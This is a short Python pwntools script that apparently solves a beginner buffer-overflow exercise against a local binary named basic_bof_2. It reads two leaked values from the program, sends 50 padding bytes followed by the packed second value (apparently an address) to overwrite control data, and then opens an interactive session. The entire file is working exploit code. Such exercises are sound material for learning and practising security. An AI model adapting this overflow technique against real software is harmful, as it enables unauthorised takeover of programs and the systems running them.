from pwn import *

p = process('./basic_bof_2')
p.recvuntil("i =")
rawa = p.recvuntil("\n")
a = int(rawa)
print(a)
p.recvuntil("into")
rawb = p.recvuntil("\n")
b = int(rawb)
print(b)
payload =b"a"*50 + p32(b)
p.send(payload)


p.interactive()
